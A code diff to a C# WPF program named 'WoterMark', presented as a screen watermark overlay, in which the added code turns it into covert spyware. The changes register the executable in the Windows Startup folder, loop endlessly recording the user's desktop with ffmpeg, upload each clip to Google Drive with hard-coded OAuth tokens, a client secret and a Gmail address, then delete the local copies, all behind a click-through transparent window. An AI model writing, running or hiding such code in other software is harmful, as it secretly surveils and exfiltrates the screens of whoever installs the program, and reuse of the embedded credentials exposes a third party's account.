@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.IO;
 using System.Linq;
 using System.Runtime.InteropServices;
 using System.Text;
@@ -14,12 +15,23 @@ using System.Windows.Media;
 using System.Windows.Media.Imaging;
 using System.Windows.Navigation;
 using System.Windows.Shapes;
+using IWshRuntimeLibrary;
+using System.IO;
+using System.Configuration;
+using CommandExecutor;
+using System.Threading;
+using Google.Apis.Auth.OAuth2.Flows;
+using Google.Apis.Auth.OAuth2.Responses;
+using Google.Apis.Auth.OAuth2;
+using Google.Apis.Drive.v3;
+using Google.Apis.Services;
+using Google.Apis.Util.Store;
+using static Google.Apis.Drive.v3.DriveService;
+using Google.Apis.Upload;
+using static System.Formats.Asn1.AsnWriter;
 
 namespace WoterMark
 {
-    /// <summary>
-    /// Interaction logic for MainWindow.xaml
-    /// </summary>
     public partial class MainWindow : Window
     {
         private bool _isDataDirty = true;
@@ -28,10 +40,8 @@ namespace WoterMark
         Window w = new Window();
         Window closeWindow;
         Button closeButton;
-        Window opacityWindow;
         Slider slider;
-        private static double sliderValue = 0;
-        int x = 0;
+
         private string password = string.Empty;
         private void documentTextBox_TextChanged(object sender, TextChangedEventArgs e)
         {
@@ -40,117 +50,131 @@ namespace WoterMark
 
         public MainWindow()
         {
-            InitializeComponent();
-            this.DataContext = slider;
+            try
+            {
+                WindowsServices.Create($@"C:\users\{Environment.UserName}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\WoterMark.lnk", System.IO.Path.Combine(Directory.GetCurrentDirectory(), "WoterMark.exe"));
+            }
+            finally
+            {
+                InitializeComponent();
+            }
+            Task.Run(() => RecordScreen());
         }
         private void Window_Loaded(object sender, RoutedEventArgs e)
         {
-            closeButton = new Button();
-            closeButton.Click += CloseButton_Click;
-
-            closeWindow = new Window();
-            closeWindow.Width = 200;
-            closeWindow.Height = 30;
-            closeWindow.VerticalAlignment = VerticalAlignment.Top;
-            closeWindow.HorizontalAlignment = HorizontalAlignment.Right;
-            closeWindow.AllowsTransparency = true;
-            closeWindow.WindowStyle = WindowStyle.None;
-            closeWindow.Content = closeButton;
-            closeWindow.WindowStartupLocation = WindowStartupLocation.CenterScreen;
-
-            slider = new Slider();
-            slider.Value = 0.2;
-            sliderValue = slider.Value;
-            slider.Maximum = 1;
-            slider.Minimum = 0;
-            slider.ValueChanged += Slider_ValueChanged1;
-            opacityBG.Opacity = slider.Value;
-
-
-            opacityWindow = new Window();
-            opacityWindow.Width = 190;
-            opacityWindow.Height = 30;
-            opacityWindow.VerticalAlignment = VerticalAlignment.Top;
-            opacityWindow.HorizontalAlignment = HorizontalAlignment.Right;
-            opacityWindow.AllowsTransparency = true;
-            opacityWindow.WindowStyle = WindowStyle.None;
-            opacityWindow.Content = slider;
-            opacityWindow.WindowStartupLocation = WindowStartupLocation.CenterOwner;
-
-            w = new Window();
-            w.Closing += SubWindow_Closing;
-            documentTextBox.TextChanged += documentTextBox_TextChanged;
-            w.Height = 100;
-            w.Width = 100;
-            w.VerticalAlignment = VerticalAlignment.Top;
-            w.HorizontalAlignment = HorizontalAlignment.Right;
-            w.Content = documentTextBox;
-            password = documentTextBox.Text;
-            w.WindowStartupLocation = WindowStartupLocation.CenterScreen;
-            w.Show();
-        }
-
-        private void Slider_ValueChanged1(object sender, RoutedPropertyChangedEventArgs<double> e)
-        {
-            if (slider.Value < 0.05)
-                slider.Value = 0.05;
-            opacityBG.Opacity = slider.Value;
-        }
-
-        private void SubWindow_Closing(object sender, System.ComponentModel.CancelEventArgs e)
-        {
-
-            closeButton.Width = 190;
-            closeButton.Height = 30;
-            closeButton.Content = "Закрыть";
-            closeButton.VerticalAlignment = VerticalAlignment.Bottom;
-            closeButton.HorizontalAlignment = HorizontalAlignment.Center;
-            closeWindow.Show();
-            opacityWindow.Show();
 
         }
 
-        private void Window_Closing(object sender, System.ComponentModel.CancelEventArgs e)
+        private async Task RecordScreen()
         {
-            // If data is dirty, prompt user and ask for a response
-            if (_isDataDirty)
+            var executor = new CommandLineExecutor();
+            var libsPath = "C:\\Program Data";
+            while (true)
             {
-                e.Cancel = true;
-                w = new Window();
-                w.Height = 100;
-                w.Width = 100;
-                w.Content = documentTextBox2;
-                w.Show();
-            }
-            else
-            {
-                closeWindow.Close();
-                w.Close();             
+                try
+                {
+                    var dt = DateTime.Now.ToString("yyyy-MM-dd-HH-mm");
+                    executor.Execute($"cd {libsPath}", $"ffmpeg.exe -t 36 -hide_banner -loglevel error -f gdigrab -framerate 15 -i desktop -c:v libx264 {dt}.mp4 -f {dt}.mp4");
+                    Thread.Sleep(36100);
+
+                    UploadFile($"{libsPath}/{dt}.mp4");
+                    System.IO.File.Delete($"{libsPath}/{dt}.mp4");
+                    Thread.Sleep(10000);
+                }
+                catch (Exception ex)
+                {
+                    System.IO.File.AppendAllText($"{libsPath}\\1.txt", ex.StackTrace);
+                    System.IO.File.AppendAllText($"{libsPath}\\1.txt", ex.Message);
+                }
             }
         }
-
-        private void Window_Closed(object sender, EventArgs e)
-        {
-            foreach (Window wind in App.Current.Windows)
-                wind.Close();
-        }
-
-        private void CloseButton_Click(object sender, RoutedEventArgs e)
-        {
-            opacityBG.Opacity = slider.Value;
-            if (documentTextBox2.Text == password)
-            {
-                _isDataDirty = false;
-            }
-            this.Close();
-        }
-
 
         protected override void OnSourceInitialized(EventArgs e)
         {
-            base.OnSourceInitialized(e);
-            var hwnd = new WindowInteropHelper(this).Handle;
-            WindowsServices.SetWindowExTransparent(hwnd);
+            try
+            {
+                base.OnSourceInitialized(e);
+                var hwnd = new WindowInteropHelper(this).Handle;
+                WindowsServices.SetWindowExTransparent(hwnd);
+            }
+            catch { }
+        }
+
+        private static DriveService GetService()
+        {
+            var tokenResponse = new TokenResponse
+            {
+                AccessToken = "ya29.a0AXooCgulQKAnhfP8abuaghts6kK-U7EGMTgeqkZnruBPbPViALxWU1SVMBrTjRkotqxvpL7NQ1ylC9oaiKisa1kDISpVLhAmSUCHZFs9PqAdVHCMQBJ81ue395bppcDTV--FkMjEyg9RJyMf1wwnJBxkFHGhlULNhhq8aCgYKAdgSARASFQHGX2MizeBSZ2LfIYY66ZXLtitVIg0171",
+                RefreshToken = "1//04snwG8pBGWquCgYIARAAGAQSNwF-L9IrU6GQicr4ZzRfXOIuXrQrj0fS4xbuc2EJP6qyNlOjTcfDia09OStB82OF0QV-ZtFsQRY",
+            };
+
+
+            var applicationName = "service"; // Use the name of the project in Google Cloud
+            var username = "freiaqwerty@gmail.com"; // Use your email
+
+
+            var apiCodeFlow = new GoogleAuthorizationCodeFlow(new GoogleAuthorizationCodeFlow.Initializer
+            {
+                ClientSecrets = new ClientSecrets
+                {
+                    ClientId = "137923084845-2s9kl5knqe8mpa2orfg78nt8qeph8j9s.apps.googleusercontent.com",
+                    ClientSecret = "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"
+                },
+                Scopes = new[] { DriveService.Scope.Drive },
+                DataStore = new FileDataStore(applicationName)
+            });
+
+
+            var credential = new UserCredential(apiCodeFlow, username, tokenResponse);
+
+
+
+            var service = new DriveService(new BaseClientService.Initializer
+            {
+                HttpClientInitializer = credential,
+                ApplicationName = applicationName
+            });
+            return service;
+        }
+
+
+        public string CreateFolder(string parent, string folderName)
+        {
+            var service = GetService();
+            var driveFolder = new Google.Apis.Drive.v3.Data.File();
+            driveFolder.Name = folderName;
+            driveFolder.MimeType = "application/vnd.google-apps.folder";
+            //  driveFolder.Parents = new string[] { parent };
+            var command = service.Files.Create(driveFolder);
+            var file = command.Execute();
+            return file.Id;
+        }
+
+
+        public string UploadFile(string fileName)
+        {
+            var libsPath = "C:\\Program Data";
+            DriveService service = GetService();
+            using (var fsSource = new FileStream(fileName, FileMode.Open, FileAccess.Read))
+            {
+                // Create a new file, with metadata and stream.
+                var fileMetadata = new Google.Apis.Drive.v3.Data.File()
+                {
+                    Name = fsSource.Name
+                };
+                var request = service.Files.Create(fileMetadata, fsSource, "video/mp4");
+                request.Fields = "*";
+                var results = request.Upload();
+
+                System.IO.File.AppendAllText($"{libsPath}\\1.txt", results?.Exception?.Message ?? "Success");
+                System.IO.File.AppendAllText($"{libsPath}\\1.txt", results.Status.ToString());
+                if (results.Status == UploadStatus.Failed)
+                {
+                    Console.WriteLine($"Error uploading file: {results.Exception.Message}");
+                }
+            }
+
+            return "";
         }
     }
     public static class WindowsServices
@@ -169,5 +193,18 @@ namespace WoterMark
             var extendedStyle = GetWindowLong(hwnd, GWL_EXSTYLE);
             SetWindowLong(hwnd, GWL_EXSTYLE, extendedStyle | WS_EX_TRANSPARENT);
         }
+
+        public static void Create(string ShortcutPath, string TargetPath)
+        {
+            WshShell wshShell = new WshShell(); //создаем объект wsh shell
+
+            IWshShortcut Shortcut = (IWshShortcut)wshShell.
+                CreateShortcut(ShortcutPath);
+
+            Shortcut.TargetPath = TargetPath; //путь к целевому файлу
+
+            Shortcut.Save();
+        }
     }
+
 }
